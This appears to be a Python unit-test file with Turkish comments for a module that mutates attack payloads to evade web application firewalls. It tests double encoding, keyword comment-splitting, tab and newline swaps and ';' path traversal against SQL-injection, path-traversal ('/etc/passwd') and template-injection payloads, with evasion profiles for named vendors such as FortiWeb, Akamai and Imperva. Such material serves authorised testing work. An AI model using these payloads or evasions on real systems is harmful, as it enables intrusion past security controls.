"""Türkçe: Payload mutasyon matrisi (payload_mutator) birim testleri — SAF, I/O YOK.

NEDEN: WAF ile backend farklı parser'lardır; mutasyon PoC'u duvarın gözünden kaçırıp
uygulamaya aynı anlamla ulaştırır. Mutasyon yanlış yazılırsa (ör. payload'u bozarsa)
doğrulayıcı sessizce başarısız olur — bu testler her mutasyonun ÇIKIŞINI ve profil
matrisini pinler.

Çalıştır: python3 orchestrator/pipeline/test_payload_mutator.py
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from pipeline.payload_mutator import (  # noqa: E402
    m_double_encode, m_case_swap, m_tab_space, m_keyword_comment,
    m_semicolon_path, m_space_pad, m_line_break, m_sql_comment_swap,
    mutation_plan, apply_mutations,
    WAF_MUTATION_PROFILE,
)


def test_double_encode():
    """Tek encode kalıntısı kalmaz: '../' → '%252e%252e%252f'."""
    out = m_double_encode("../../../../etc/passwd")
    assert "../" not in out and "%25" in out


def test_case_swap():
    out = m_case_swap("select")
    assert out.lower() == "select" and out != "select"


def test_tab_space():
    """Boşluk → GERÇEK tab; urlencode katmanından sonra '%09' olarak ulaşmalı
    ('%09' METNİ koymak çift-encode'da ölür — '%2509' literal kalır)."""
    from urllib.parse import urlencode
    out = m_tab_space("' AND SLEEP(5)-- -")
    assert "\tAND\tSLEEP" in out
    # Katman testi: doğrulayıcı urlencode'dan geçirir → tab '%09' olur (tek çözümle tab).
    assert "%09AND%09SLEEP" in urlencode({"x": out})


def test_keyword_comment():
    """SQL anahtar kelime bölünür: SLEEP → SL/**/EEP gibi; payload gerisi bozulmaz."""
    out = m_keyword_comment("' AND SLEEP(5)-- -")
    assert "/**/" in out and "SLEEP" not in out
    assert out.startswith("' ") and out.endswith("-- -")


def test_semicolon_path():
    assert m_semicolon_path("../../../../etc/passwd") == "..;/..;/..;/..;/etc/passwd"
    # Traversal içermeyen payload'a dokunmaz.
    assert m_semicolon_path("{{1337*1367}}") == "{{1337*1367}}"


def test_space_pad():
    assert m_space_pad("{{1337*1367}}") == "{{ 1337*1367 }}"
    assert m_space_pad("${1337*1367}") == "${ 1337*1367 }"
    # Şablon olmayana dokunmaz.
    assert m_space_pad("normal") == "normal"


def test_line_break():
    """Boşluk → gerçek '\\n'; satır-anchored WAF regex'i bölünür, SQL newline'ı ws sayar.
    Gerçek karakter (metin '%0a' DEĞİL — bkz. tab_space çift-encode tuzağı)."""
    from urllib.parse import urlencode
    out = m_line_break("' AND SLEEP(5)")
    assert "\nAND\nSLEEP" in out and "%0a" not in out
    assert "%0AAND%0ASLEEP" in urlencode({"x": out})   # tek katman çözümleme garantisi


def test_sql_comment_swap():
    """'-- -' / '--' kuyruğu → '#' (MySQL eşdeğer yorum); SLEEP gövdesi bozulmaz."""
    assert m_sql_comment_swap("' AND SLEEP(5)-- -") == "' AND SLEEP(5)#"
    assert m_sql_comment_swap("1 WAITFOR DELAY '0:0:5'--") == "1 WAITFOR DELAY '0:0:5'#"
    # Yorum kuyruğu yoksa no-op (diğer sınıflara dokunmaz).
    assert m_sql_comment_swap("{{7*7}}") == "{{7*7}}"


def test_mutations_never_throw():
    """Bozuk girdi → orijinali döndür (doğrulayıcı akışı asla kırılmaz)."""
    for fn in (m_double_encode, m_case_swap, m_tab_space, m_keyword_comment,
               m_semicolon_path, m_space_pad, m_line_break, m_sql_comment_swap):
        assert isinstance(fn(""), str)
        assert isinstance(fn("../../../../"), str)


def test_fortiweb_profile_per_class():
    """FortiWeb profili: sqli'de double_encode önce; lfi'de semicolon_path var."""
    plan = mutation_plan("fortiweb", "sqli")
    assert [n for n, _ in plan][0] == "double_encode"
    assert "keyword_comment" in [n for n, _ in plan]
    plan_lfi = mutation_plan("fortiweb", "lfi")
    assert "semicolon_path" in [n for n, _ in plan_lfi]


def test_unknown_vendor_falls_back_to_generic():
    plan = mutation_plan("bilinmeyen-waf", "sqli")
    assert plan  # generic profil devreye girer
    assert [n for n, _ in plan] == WAF_MUTATION_PROFILE["generic"]["sqli"][:3]


def test_enterprise_vendor_profiles_defined():
    """T4-A madde 3: kurumsal vendor'lar generic'e DÜŞMEZ — waf_detect vendor string'iyle
    birebir anahtar (akamai/imperva/f5_asm/aws_waf/sucuri) ve tüm profiller YALNIZ
    kayıtlı mutasyon adlarını referanslar (tipoları sessiz no-op yapmasın)."""
    registered = set(WAF_MUTATION_PROFILE)
    for vendor in ("akamai", "imperva", "f5_asm", "aws_waf", "sucuri"):
        assert vendor in registered, vendor
        prof = WAF_MUTATION_PROFILE[vendor]
        assert set(prof) >= {"sqli", "lfi", "xss", "ssti"}, vendor
        for cls, names in prof.items():
            assert names, f"{vendor}/{cls} boş"
    from pipeline.payload_mutator import _MUTATIONS
    for vendor, prof in WAF_MUTATION_PROFILE.items():
        for cls, names in prof.items():
            for n in names:
                assert n in _MUTATIONS, f"{vendor}/{cls}: {n} kayıtlı mutasyon değil"


def test_waf_detect_vendor_keys_match():
    """waf_detect._WAF_SIGNATURES vendor'larının HERBİRİ ya profil sahibi ya bilinçli
    generic — imza vendor string'i ile profil anahtarı senkron kalmalı."""
    from pipeline.waf_detect import _WAF_SIGNATURES
    vendors = {v for v, *_ in _WAF_SIGNATURES}
    missing = vendors - set(WAF_MUTATION_PROFILE)
    assert not missing, f"waf_detect vendor'ları profilsiz: {missing}"


def test_learned_order_prioritizes():
    """Öğrenilmiş başarı ('tab_space FortiWeb'de çalıştı') planın BAŞINA gelir."""
    plan = mutation_plan("fortiweb", "sqli", learned_order=["tab_space"])
    assert [n for n, _ in plan][0] == "tab_space"
    # Öğrenilmiş ama profilde olmayan mutasyon eklenmez.
    plan2 = mutation_plan("fortiweb", "sqli", learned_order=["olmayan_mutasyon"])
    assert all(n != "olmayan_mutasyon" for n, _ in plan2)


def test_apply_mutations_dedup_and_identity():
    """Orijinal her zaman ilk varyant; no-op mutasyon mükerrer istek ÜRETMEZ."""
    variants = apply_mutations("abc", [("case_swap", m_case_swap), ("identity", lambda p: p)])
    assert variants[0] == ("abc", None)
    assert len(variants) == 2  # identity no-op → düşürüldü


def test_apply_mutations_retry_skips_identity():
    """include_identity=False (adaptif retry): temel payload TEKRAR üretilmez —
    ilk denemede zaten atıldı, bütçe yalnız mutasyonlu varyantlara harcanır."""
    variants = apply_mutations("abc", [("case_swap", m_case_swap)],
                               include_identity=False)
    assert variants == [("aBc", "case_swap")]


def main():
    tests = [
        test_double_encode, test_case_swap, test_tab_space, test_keyword_comment,
        test_semicolon_path, test_space_pad, test_line_break, test_sql_comment_swap,
        test_mutations_never_throw, test_fortiweb_profile_per_class,
        test_unknown_vendor_falls_back_to_generic, test_enterprise_vendor_profiles_defined,
        test_waf_detect_vendor_keys_match, test_learned_order_prioritizes,
        test_apply_mutations_dedup_and_identity, test_apply_mutations_retry_skips_identity,
    ]
    for t in tests:
        t()
        print(f"[OK] {t.__name__}")
    print("\nTüm testler geçti.")


if __name__ == "__main__":
    main()
